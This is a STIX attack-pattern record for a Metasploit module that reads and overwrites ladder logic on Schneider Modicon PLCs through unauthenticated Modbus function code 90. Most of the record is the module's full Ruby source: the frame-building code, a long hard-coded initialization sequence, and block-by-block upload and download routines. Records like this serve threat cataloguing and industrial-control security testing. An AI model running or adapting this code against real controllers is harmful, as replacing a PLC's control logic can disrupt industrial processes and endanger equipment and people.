{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--86a36fc3-24fa-477f-9861-ae60ee225473",
    "created": "2024-08-14T16:22:23.770744Z",
    "modified": "2024-08-14T16:22:23.770749Z",
    "name": "Schneider Modicon Ladder Logic Upload/Download",
    "description": " The Schneider Modicon with Unity series of PLCs use Modbus function code 90 (0x5a) to send and receive ladder logic.  The protocol is unauthenticated, and allows a rogue host to retrieve the existing logic and to upload new logic.  Two modes are supported: \"SEND\" and \"RECV,\" which behave as one might expect -- use 'set mode ACTIONAME' to use either mode of operation.  In either mode, FILENAME must be set to a valid path to an existing file (for SENDing) or a new file (for RECVing), and the directory must already exist.  The default, 'modicon_ladder.apx' is a blank ladder logic file which can be used for testing.  This module is based on the original 'modiconstux.rb' Basecamp module from DigitalBond. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/scada/modicon_stux_transfer.rb",
            "external_id": "modicon_stux_transfer.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.digitalbond.com/tools/basecamp/metasploit-modules/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Rex::Socket::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Schneider Modicon Ladder Logic Upload/Download',\n      'Description'    => %q{\n        The Schneider Modicon with Unity series of PLCs use Modbus function\n        code 90 (0x5a) to send and receive ladder logic.  The protocol is\n        unauthenticated, and allows a rogue host to retrieve the existing\n        logic and to upload new logic.\n\n        Two modes are supported: \"SEND\" and \"RECV,\" which behave as one might\n        expect -- use 'set mode ACTIONAME' to use either mode of operation.\n\n        In either mode, FILENAME must be set to a valid path to an existing\n        file (for SENDing) or a new file (for RECVing), and the directory must\n        already exist.  The default, 'modicon_ladder.apx' is a blank\n        ladder logic file which can be used for testing.\n\n        This module is based on the original 'modiconstux.rb' Basecamp module from\n        DigitalBond.\n      },\n      'Author'         =>\n        [\n          'K. Reid Wightman <wightman[at]digitalbond.com>', # original module\n          'todb' # Metasploit fixups\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]\n        ],\n      'DisclosureDate' => '2012-04-05'\n      ))\n\n    register_options(\n      [\n        OptString.new('FILENAME',\n          [\n            true,\n            \"The file to send or receive\",\n            File.join(Msf::Config.data_directory, \"exploits\", \"modicon_ladder.apx\")\n          ]),\n        OptEnum.new(\"MODE\", [true, 'File transfer operation', \"SEND\",\n          [\n            \"SEND\",\n            \"RECV\"\n          ]\n        ]),\n        Opt::RPORT(502)\n      ])\n\n  end\n\n  def run\n    unless valid_filename?\n      print_error \"FILENAME invalid: #{datastore['FILENAME'].inspect}\"\n      return nil\n    end\n    @modbuscounter = 0x0000 # used for modbus frames\n    connect\n    init\n    case datastore['MODE']\n    when \"SEND\"\n      writefile\n    when \"RECV\"\n      readfile\n    end\n  end\n\n  def valid_filename?\n    if datastore['MODE'] == \"SEND\"\n      File.readable? datastore['FILENAME']\n    else\n      File.writable?(File.split(datastore['FILENAME'])[0].to_s)\n    end\n  end\n\n  # this is used for building a Modbus frame\n  # just prepends the payload with a modbus header\n  def makeframe(packetdata)\n    if packetdata.size > 255\n      print_error(\"#{rhost}:#{rport} - MODBUS - Packet too large: #{packetdata.inspect}\")\n      return\n    end\n    payload = \"\"\n    payload += [@modbuscounter].pack(\"n\")\n    payload += \"\\x00\\x00\\x00\" #dunno what these are\n    payload += [packetdata.size].pack(\"c\") # size byte\n    payload += packetdata\n  end\n\n  # a wrapper just to be sure we increment the counter\n  def sendframe(payload)\n    sock.put(payload)\n    @modbuscounter += 1\n    # TODO: Fix with sock.timed_read -- Should make it faster, just need a test.\n    r = sock.recv(65535, 0.1)\n    return r\n  end\n\n  # This function sends some initialization requests\n  # required for priming the Quantum\n  def init\n    payload = \"\\x00\\x5a\\x00\\x02\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x01\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x0a\\x00\" + 'T' * 0xf9\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x03\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x03\\x04\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x04\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x01\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x0a\\x00\"\n    (0..0xf9).each { |x| payload += [x].pack(\"c\") }\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x04\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x04\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x13\\x00\\x00\\x00\\x00\\x00\\x64\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x13\\x00\\x64\\x00\\x00\\x00\\x9c\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x14\\x00\\x00\\x00\\x00\\x00\\x64\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x14\\x00\\x64\\x00\\x00\\x00\\xf6\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x14\\x00\\x5a\\x01\\x00\\x00\\xf6\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x14\\x00\\x5a\\x02\\x00\\x00\\xf6\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x14\\x00\\x46\\x03\\x00\\x00\\xf6\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x14\\x00\\x3c\\x04\\x00\\x00\\xf6\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x14\\x00\\x32\\x05\\x00\\x00\\xf6\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x14\\x00\\x28\\x06\\x00\\x00\\x0c\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x13\\x00\\x00\\x00\\x00\\x00\\x64\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x20\\x00\\x13\\x00\\x64\\x00\\x00\\x00\\x9c\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x10\\x43\\x4c\\x00\\x00\\x0f\"\n    payload += \"USER-714E74F21B\" # Yep, really\n    #payload += \"META-SPLOITMETA\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x01\\x04\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x01\\x50\\x15\\x00\\x01\\x0b\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x01\\x50\\x15\\x00\\x01\\x07\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x01\\x12\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x01\\x04\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x01\\x12\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x01\\x04\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x02\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x58\\x01\\x00\\x00\\x00\\x00\\xff\\xff\\x00\\x70\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x58\\x07\\x01\\x80\\x00\\x00\\x00\\x00\\xfb\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x01\\x04\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x58\\x07\\x01\\x80\\x00\\x00\\x00\\x00\\xfb\\x00\"\n    sendframe(makeframe(payload))\n  end\n\n  # Write the contents of local file filename to the target's filenumber\n  # blank logic files will be available on the Digital Bond website\n  def writefile\n    print_status \"#{rhost}:#{rport} - MODBUS - Sending write request\"\n    blocksize = 244\t# bytes per block in file transfer\n    buf = File.binread(datastore['FILENAME'])\n    fullblocks = buf.length / blocksize\n    if fullblocks > 255\n      print_error(\"#{rhost}:#{rport} - MODBUS - File too large, aborting.\")\n      return\n    end\n    lastblocksize = buf.length - (blocksize*fullblocks)\n    fileblocks = fullblocks\n    if lastblocksize != 0\n      fileblocks += 1\n    end\n    filetype = buf[0..2]\n    if filetype == \"APX\"\n      filenum = \"\\x01\"\n    elsif filetype == \"APB\"\n      filenum = \"\\x10\"\n    end\n    payload = \"\\x00\\x5a\\x00\\x03\\x01\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x02\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x01\\x04\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x02\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x01\\x04\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x58\\x02\\x01\\x00\\x00\\x00\\x00\\x00\\xfb\\x00\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x00\\x02\"\n    sendframe(makeframe(payload))\n    payload = \"\\x00\\x5a\\x01\\x30\\x00\"\n    payload += filenum\n    response = sendframe(makeframe(payload))\n    if response[8..9] == \"\\x01\\xfe\"\n      print_status(\"#{rhost}:#{rport} - MODBUS - Write request success!  Writing file...\")\n    else\n      print_error(\"#{rhost}:#{rport} - MODBUS - Write request error.  Aborting.\")\n      return\n    end\n    payload = \"\\x00\\x5a\\x01\\x04\"\n    sendframe(makeframe(payload))\n    block = 1\n    block2status = 0 # block 2 must always be sent twice\n    while block <= fullblocks\n      payload = \"\\x00\\x5a\\x01\\x31\\x00\"\n      payload += filenum\n      payload += [block].pack(\"c\")\n      payload += \"\\x00\\xf4\\x00\"\n      payload += buf[((block - 1) * 244)..((block * 244) - 1)]\n      res = sendframe(makeframe(payload))\n      vprint_status \"#{rhost}:#{rport} - MODBUS - Block #{block}: #{payload.inspect}\"\n      if res[8..9] != \"\\x01\\xfe\"\n        print_error(\"#{rhost}:#{rport} - MODBUS - Failure writing block #{block}\")\n        return\n      end\n      # redo this iteration of the loop if we're on block 2\n      if block2status == 0 and block == 2\n        print_status(\"#{rhost}:#{rport} - MODBUS - Sending block 2 a second time\")\n        block2status = 1\n        redo\n      end\n      block += 1\n    end\n    if lastblocksize > 0\n      payload = \"\\x00\\x5a\\x01\\x31\\x00\"\n      payload += filenum\n      payload += [block].pack(\"c\")\n      payload += \"\\x00\" + [lastblocksize].pack(\"c\") + \"\\x00\"\n      payload += buf[((block-1) * 244)..(((block-1) * 244) + lastblocksize)]\n      vprint_status \"#{rhost}:#{rport} - MODBUS - Block #{block}: #{payload.inspect}\"\n      res = sendframe(makeframe(payload))\n      if res[8..9] != \"\\x01\\xfe\"\n        print_error(\"#{rhost}:#{rport} - MODBUS - Failure writing last block\")\n        return\n      end\n    end\n    vprint_status \"#{rhost}:#{rport} - MODBUS - Closing file\"\n    payload = \"\\x00\\x5a\\x01\\x32\\x00\\x01\" + [fileblocks].pack(\"c\") + \"\\x00\"\n    sendframe(makeframe(payload))\n  end\n\n  # Only reading the STL file is supported at the moment :(\n  def readfile\n    print_status \"#{rhost}:#{rport} - MODBUS - Sending read request\"\n    file = File.open(datastore['FILENAME'], 'wb')\n    payload = \"\\x00\\x5a\\x01\\x33\\x00\\x01\\xfb\\x00\"\n    response = sendframe(makeframe(payload))\n    print_status(\"#{rhost}:#{rport} - MODBUS - Retrieving file\")\n    block = 1\n    filedata = \"\"\n    finished = false\n    while !finished\n      payload = \"\\x00\\x5a\\x01\\x34\\x00\\x01\"\n      payload += [block].pack(\"c\")\n      payload += \"\\x00\"\n      response = sendframe(makeframe(payload))\n      filedata += response[0xe..-1]\n      vprint_status \"#{rhost}:#{rport} - MODBUS - Block #{block}: #{response[0xe..-1].inspect}\"\n      if response[0xa] == \"\\x01\" # apparently 0x00 == more data, 0x01 == eof?\n        finished = true\n      else\n        block += 1\n      end\n    end\n    print_status(\"#{rhost}:#{rport} - MODBUS - Closing file\")\n    payload = \"\\x00\\x5a\\x01\\x35\\x00\\x01\" + [block].pack(\"c\") + \"\\x00\"\n    sendframe(makeframe(payload))\n    file.print filedata\n    file.close\n  end\n\n  def cleanup\n    disconnect rescue nil\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-04-05"
}